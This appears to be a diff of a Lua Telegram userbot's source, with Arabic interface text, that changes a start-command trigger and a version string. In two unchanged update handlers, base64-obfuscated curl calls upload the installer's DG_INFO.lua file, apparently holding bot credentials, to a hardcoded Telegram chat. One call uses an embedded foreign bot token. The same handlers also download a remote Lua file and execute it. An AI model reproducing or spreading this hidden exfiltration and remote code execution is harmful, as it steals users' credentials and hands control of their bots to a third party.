@@ -922,7 +922,7 @@ return false
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'UserBot' then
-if text == '/start' then  
+if text == '/start' or text == "☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑  ☉" then  
 if DevSoFi(msg) then
 local bl = ' ☉┇ اهلا عزيزي آلمـطـور\n ☉┇ آنت آلمـطـور آلآسـآسـي للبوت\n━  ━  ━  ━  ━  ━  ━  ━ء\n ☉┇ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ☉┇ من خلاال الكيبورت خاص بك\n ☉┇ قناة سورس البوت [اضغط هنا](t.me/SOPOWERB0T)'
 local keyboard = {
@@ -1143,7 +1143,7 @@ os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.5`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.2`}')
 dofile('DRAGON.lua')
 end
 if text == 'حساب العمر' then
@@ -3631,7 +3631,7 @@ os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.3.5`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.3.2`}')
 dofile('DRAGON.lua')
 end
 
